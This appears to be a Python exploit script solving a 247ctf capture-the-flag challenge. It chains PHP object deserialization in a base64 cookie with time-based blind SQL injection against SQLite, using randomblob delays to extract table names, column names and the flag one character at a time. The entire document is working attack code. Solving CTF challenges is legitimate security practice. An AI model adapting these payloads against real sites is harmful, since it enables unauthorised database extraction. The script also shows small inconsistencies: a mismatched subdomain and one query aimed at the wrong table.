import requests
import sys
import base64
import string

subdomain = "6c6b756368bdce0b"
url = f"https://{subdomain}.247ctf.com/"

def make_cookie(query):
    payload = 'O:10:"insert_log":1:{s:8:"new_data";s:%s:"%s";}' % (len(query), query)
    payload = base64.b64encode(payload.encode("utf-8")).decode()
    payload = f"{payload}.0e.a"
    return payload

req_time = 0
for i in range(5):
    req_time = max(req_time,requests.get(url).elapsed.total_seconds())
print(req_time)

sleep_time = 999999
for i in range(5):
    cookies= {
        "247": make_cookie("""a"'); SELECT 1 WHERE 1==randomblob(9000000000);--""")
    }
    sleep_time = min(sleep_time,requests.get(url,cookies=cookies).elapsed.total_seconds())
print(sleep_time)

def check_error(query):
    max_time = sleep_time - 0.3
    cookies= {
        "247": make_cookie(query)
    }
    try:
        r = requests.get("https://cb4f9f70d16192cd.247ctf.com/", cookies=cookies,timeout= max_time)
        return False
    except:
        return True

def list_tables():
    partial_tables = []
    tables = []
    for char in string.ascii_lowercase + string.digits + "#" + "$" + "-" + "." + "{" + "}" + " " + "(" + ")":
        if check_error(f"""a"'); SELECT name FROM sqlite_master WHERE name LIKE '{char}%' AND 1=randomblob(9000000000) AND 1=randomblob(9000000000) AND 1=randomblob(9000000000);--"""):
            partial_tables.append(char)

    while partial_tables:
        current_name = partial_tables.pop()
        match = False
        for char in string.ascii_lowercase + string.digits + "#" + "$" + "-" + "." + "{" + "}" + " " + "(" + ")":
            if check_error(f"""a"'); SELECT name FROM sqlite_master WHERE name LIKE '{current_name}{char}%' AND 1=randomblob(9000000000) AND 1=randomblob(9000000000) AND 1=randomblob(9000000000);--"""):
                partial_tables.append(current_name + char)
                match = True
        if(not match):
            tables.append(current_name)
    return tables

def list_fields(table):
    partial_field = []
    fields = []
    for char in string.ascii_lowercase + string.digits + "#" + "$" + "-" + "." + "{" + "}" + " " + "(" + ")":
        if check_error(f"""a"'); SELECT name FROM sqlite_master WHERE name LIKE '{char}%' AND 1=randomblob(9000000000) AND 1=randomblob(9000000000) AND 1=randomblob(9000000000);--"""):
            partial_field.append(char)

    while partial_field:
        current_name = partial_field.pop()
        match = False
        for char in string.ascii_lowercase + string.digits + "#" + "$" + "-" + "." + "{" + "}" + " " + "(" + ")":
            if check_error(f"""a"'); SELECT name FROM PRAGMA_TABLE_INFO('{table}') WHERE name LIKE '{current_name}{char}%' AND 1=randomblob(9000000000) AND 1=randomblob(9000000000) AND 1=randomblob(9000000000);--"""):
                partial_field.append(current_name + char)
                match = True
        if(not match):
            fields.append(current_name)
    return fields

def get_flag():
    flag = ""
    last_char = ""
    while last_char != "}":
        for char in string.ascii_letters  + string.digits + "#" + "$" + "-" + "." + "{" + "}" + " " + "(" + ")":
            if check_error(f"""a"'); SELECT flag FROM flag WHERE flag LIKE '{flag + char}%' AND 1=randomblob(9000000000) AND 1=randomblob(9000000000) AND 1=randomblob(9000000000);--"""):
                flag = flag + char
                last_char = char
    return flag

print(get_flag())